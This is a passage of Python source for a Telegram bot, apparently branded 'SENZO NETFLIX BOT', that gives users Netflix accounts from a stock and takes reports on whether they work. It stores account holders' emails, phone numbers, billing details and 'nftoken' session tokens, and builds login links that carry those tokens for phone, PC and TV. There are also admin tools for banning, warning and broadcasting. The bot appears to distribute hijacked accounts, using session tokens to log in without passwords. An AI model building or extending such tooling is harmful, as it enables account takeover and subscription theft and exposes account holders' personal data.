    async def _send_notworking_to_channel(self, bot, report_id: int, user_id: int, account_id: int, screenshot_file_id: str):
        """Send not working account to channel."""
        if not REPORT_CHANNEL_ID:
            return None
        
        try:
            user = self.user_repo.get(user_id)
            account = self.account_repo.get_assigned(user_id)
            
            if not account:
                cur = self.db.execute_sqlite('SELECT * FROM accounts WHERE id = ?', (account_id,))
                row = cur.fetchone()
                if row:
                    account = Account(
                        id=row[0], email=safe_str(row[1]), country=safe_str(row[2]),
                        plan=safe_str(row[3]), account_name=safe_str(row[15]),
                        streams=safe_int(row[16]), quality=safe_str(row[17]),
                        price=safe_str(row[18]), billing_date=safe_str(row[19]),
                        extra_member=safe_bool(row[24]), profiles=safe_str(row[28]),
                        user_guid=safe_str(row[29]), nftoken=safe_str(row[5]),
                        nftoken_expiry=safe_str(row[6]), phone=safe_str(row[23]),
                        membership_status=safe_str(row[25])
                    )
            
            if not account:
                return None
            
            token = safe_str(account.nftoken)
            nft_expiry = safe_str(account.nftoken_expiry)
            
            text = f"""❌ <b>NOT WORKING ACCOUNT REPORTED!</b>

━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{html_escape(account.email)}</code>
👤 <b>Name:</b> {html_escape(account.account_name)}
📱 <b>Phone:</b> {html_escape(account.phone, 'Not provided')}
🌍 <b>Country:</b> {html_escape(account.country)}
📦 <b>Plan:</b> {html_escape(account.plan)}
━━━━━━━━━━━━━━━━━━━━━

🔑 <b>ADMIN: Test this account before deciding</b>
"""
            if token and len(token) > 10:
                text += f"\n⏳ <b>NFToken expires:</b> <code>{html_escape(nft_expiry)}</code>\n"
            
            text += f"""
━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>Reported by:</b> @{html_escape(user.username)}
🕐 <b>Time:</b> {get_timestamp()} UTC
━━━━━━━━━━━━━━━━━━━━━
👨‍💻 <b>Developer:</b> @Senzo268

⛔ <b>This account is reported as NOT working!</b>
⚠️ <b>Dismiss = Account will be REMOVED from stock</b>
"""
            
            keyboard = []
            if token and len(token) > 10:
                keyboard.append([
                    InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                    InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
                ])
                keyboard.append([
                    InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
                ])
            else:
                keyboard.append([
                    InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                    InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
                ])
                keyboard.append([
                    InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
                ])
            
            keyboard.append([
                InlineKeyboardButton("✅ Yes, Ban User", callback_data=f"ban_user_{report_id}_{account_id}_{user_id}"),
                InlineKeyboardButton("⚠️ Warn User", callback_data=f"warn_user_{report_id}_{account_id}_{user_id}"),
                InlineKeyboardButton("❌ Dismiss", callback_data=f"dismiss_report_{report_id}_{account_id}")
            ])
            
            try:
                sent_message = await bot.send_photo(
                    chat_id=REPORT_CHANNEL_ID,
                    photo=screenshot_file_id,
                    caption=text,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.HTML
                )
                self.db.execute_turso('UPDATE reports SET channel_post_id = ? WHERE id = ?', (sent_message.message_id, report_id))
                self.db.commit_turso()
                return sent_message.message_id
            except Exception as e:
                logger.error(f"Failed to send not working photo: {e}")
                try:
                    sent_message = await bot.send_message(
                        chat_id=REPORT_CHANNEL_ID,
                        text=text,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode=ParseMode.HTML
                    )
                    self.db.execute_turso('UPDATE reports SET channel_post_id = ? WHERE id = ?', (sent_message.message_id, report_id))
                    self.db.commit_turso()
                    return sent_message.message_id
                except Exception as ex:
                    logger.error(f"Failed to send not working text: {ex}")
                    return None
        except Exception as e:
            logger.error(f"_send_notworking_to_channel error: {e}")
            return None
    
    # ============================================================
    # MESSAGE HANDLERS
    # ============================================================
    
    async def handle_text_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages."""
        try:
            user_id = update.effective_user.id
            msg_text = update.message.text or ""
            
            # Contact Admin
            if context.user_data.get("waiting_for_message"):
                context.user_data["waiting_for_message"] = False
                for aid in ADMIN_IDS:
                    try:
                        await context.bot.send_message(
                            aid,
                            f"📩 <b>NEW MESSAGE FROM USER</b>\n\n"
                            f"From: @{html_escape(update.effective_user.username)} (ID: <code>{user_id}</code>)\n\n"
                            f"Message:\n<i>{html_escape(msg_text)}</i>\n\n"
                            f"Reply: /reply {user_id} your message",
                            parse_mode=ParseMode.HTML
                        )
                    except Exception:
                        pass
                await update.message.reply_text("✅ Message sent to admins!", parse_mode=ParseMode.HTML)
                return
            
            # Admin Broadcast Text
            if is_admin(user_id) and context.user_data.get("waiting_for_broadcast"):
                context.user_data["waiting_for_broadcast"] = False
                users = self.user_repo.get_all()
                active_users = [u for u in users if not u.is_banned]
                total_u = len(active_users)
                
                status_msg = await update.message.reply_text(f"🚀 Broadcasting to <b>{total_u}</b> users...", parse_mode=ParseMode.HTML)
                
                success, failed = 0, 0
                for u in active_users:
                    try:
                        await context.bot.send_message(u.user_id, msg_text, parse_mode=ParseMode.HTML)
                        success += 1
                    except Exception:
                        failed += 1
                    await asyncio.sleep(0.05)
                
                await status_msg.edit_text(
                    f"✅ <b>BROADCAST COMPLETE!</b>\n\n"
                    f"👥 Total: <b>{total_u}</b>\n"
                    f"✅ Sent: <b>{success}</b>\n"
                    f"❌ Failed: <b>{failed}</b>",
                    parse_mode=ParseMode.HTML
                )
                return
            
            # Admin User Search
            if is_admin(user_id) and context.user_data.get("waiting_for_user_search"):
                context.user_data["waiting_for_user_search"] = False
                user = self.user_repo.find_by_query(msg_text)
                if not user or not user.user_id:
                    await update.message.reply_text(f"❌ User <b>{html_escape(msg_text)}</b> not found.", parse_mode=ParseMode.HTML)
                    return
                
                target_uid = user.user_id
                text = f"""👤 <b>USER SEARCH RESULT</b>
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>ID:</b> <code>{target_uid}</code>
Username: @{html_escape(user.username)}
📅 Joined: {html_escape(user.joined_at)}
🚫 Banned: {'YES' if user.is_banned else 'NO'}
⚠️ Warnings: {user.warnings}/3
📦 Accounts Used: {user.accounts_used}/{MAX_ACCOUNTS_PER_USER}
✅ Working Reports: {user.working_reports}
❌ Not Working: {user.notworking_reports}
━━━━━━━━━━━━━━━━━━━━━
"""
                keyboard = []
                if user.is_banned:
                    keyboard.append([InlineKeyboardButton("🔓 Unban", callback_data=f"unban_user_{target_uid}")])
                else:
                    keyboard.append([InlineKeyboardButton("🚫 Ban", callback_data=f"admin_ban_{target_uid}")])
                    keyboard.append([InlineKeyboardButton("⚠️ Warn", callback_data=f"admin_warn_{target_uid}")])
                
                keyboard.append([InlineKeyboardButton("🔄 Reset Limits", callback_data=f"reset_user_{target_uid}")])
                keyboard.append([InlineKeyboardButton("🔙 Back to Users", callback_data="admin_users")])
                
                await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
                return
            
            # Admin Add Channel
            if is_admin(user_id) and context.user_data.get("waiting_for_channel"):
                context.user_data["waiting_for_channel"] = False
                parts = [p.strip() for p in msg_text.split("|")]
                if len(parts) == 3:
                    ch_id, ch_name, ch_link = parts[0], parts[1], parts[2]
                    try:
                        self.db.execute_turso('INSERT OR REPLACE INTO channels (channel_id, channel_name, invite_link) VALUES (?, ?, ?)', (ch_id, ch_name, ch_link))
                        self.db.commit_turso()
                        await update.message.reply_text("✅ Channel added!", parse_mode=ParseMode.HTML)
                    except Exception as e:
                        await update.message.reply_text(f"❌ Error: {e}")
                else:
                    await update.message.reply_text("❌ Invalid format! Use: <code>ID | NAME | LINK</code>", parse_mode=ParseMode.HTML)
                return
            
            await self.start(update, context)
        except Exception as e:
            logger.error(f"handle_text_messages error: {e}")

# ============================================================
# MAIN APPLICATION
# ============================================================
def main():
    """Main application entry point."""
    print("=" * 70)
    print("🎬 SENZO NETFLIX BOT - PRODUCTION READY")
    print("=" * 70)
    print(f"🗄️ Database: Turso (Persistent) + SQLite (Accounts)")
    print(f"👤 Admins: {ADMIN_IDS}")
    print(f"📢 Report Channel: {REPORT_CHANNEL_ID if REPORT_CHANNEL_ID else 'NOT SET'}")
    print(f"⏳ Cooldown: {WORKING_COOLDOWN_MINUTES} min")
    print(f"🔧 Threads: {MAX_CHECK_THREADS}")
    print("=" * 70)
    
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set!")
        return
    
    # Start health server
    try:
        health_thread = threading.Thread(target=start_health_server, daemon=True)
        health_thread.start()
    except Exception as e:
        logger.error(f"Health server error: {e}")
    
    # Initialize handlers
    handlers = BotHandlers()
    
    # Build application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    application.add_handler(CommandHandler(["start", "help"], handlers.start))
    application.add_handler(CommandHandler(["get", "gen", "account"], handlers.get_account_callback))
    application.add_handler(CommandHandler(["status", "mystatus"], handlers.my_status))
    application.add_handler(CommandHandler(["stats"], handlers.stats_command))
    application.add_handler(CommandHandler(["contact"], handlers.contact_admin))
    application.add_handler(CommandHandler(["admin"], handlers.admin_panel))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(handlers.get_account_callback, pattern="^get_account$"))
    application.add_handler(CallbackQueryHandler(handlers.working_callback, pattern="^(working|report_working_)"))
    application.add_handler(CallbackQueryHandler(handlers.notworking_callback, pattern="^(notworking|report_notworking_)"))
    application.add_handler(CallbackQueryHandler(handlers.contact_admin, pattern="^contact$"))
    application.add_handler(CallbackQueryHandler(handlers.my_status, pattern="^my_status$"))
    application.add_handler(CallbackQueryHandler(handlers.back_to_menu, pattern="^back_menu$"))
    
    # Admin callbacks
    application.add_handler(CallbackQueryHandler(handlers.admin_panel, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_stock_mgr, pattern="^(admin_stock_mgr|sm_filter_)"))
    application.add_handler(CallbackQueryHandler(handlers.delete_account_callback, pattern="^(del_acc_|clear_stock_)"))
    application.add_handler(CallbackQueryHandler(handlers.admin_user_search_prompt, pattern="^admin_user_search$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_banned, pattern="^admin_banned$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_upload, pattern="^admin_upload$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_reports, pattern="^admin_reports$"))
    application.add_handler(CallbackQueryHandler(handlers.view_report_detail, pattern="^view_rep_"))
    application.add_handler(CallbackQueryHandler(handlers.admin_users, pattern="^admin_users$"))
    application.add_handler(CallbackQueryHandler(handlers.manage_user_detail, pattern="^manage_user_"))
    application.add_handler(CallbackQueryHandler(handlers.admin_user_actions_callback, pattern="^(admin_ban_|admin_warn_|reset_user_)"))
    application.add_handler(CallbackQueryHandler(handlers.unban_user_callback, pattern="^unban_user_"))
    application.add_handler(CallbackQueryHandler(handlers.admin_broadcast, pattern="^admin_broadcast$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_channels, pattern="^admin_channels$"))
    application.add_handler(CallbackQueryHandler(handlers.add_channel_prompt, pattern="^add_channel_prompt$"))
    application.add_handler(CallbackQueryHandler(handlers.del_channel_callback, pattern="^del_channel_"))
    application.add_handler(CallbackQueryHandler(handlers.admin_stock_logs, pattern="^admin_stock_logs$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_dashboard, pattern="^admin_dashboard$"))
    
    # Channel action callbacks
    application.add_handler(CallbackQueryHandler(handlers.confirm_working_callback, pattern="^confirm_working_"))
    application.add_handler(CallbackQueryHandler(handlers.ban_user_callback, pattern="^ban_user_"))
    application.add_handler(CallbackQueryHandler(handlers.warn_user_callback, pattern="^warn_user_"))
    application.add_handler(CallbackQueryHandler(handlers.dismiss_report_callback, pattern="^dismiss_report_"))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.PHOTO, handlers.handle_screenshot))
    application.add_handler(MessageHandler(filters.Document.ALL, handlers.handle_file_upload))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handlers.handle_text_messages))
    
    try:
        print("🚀 Starting bot...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
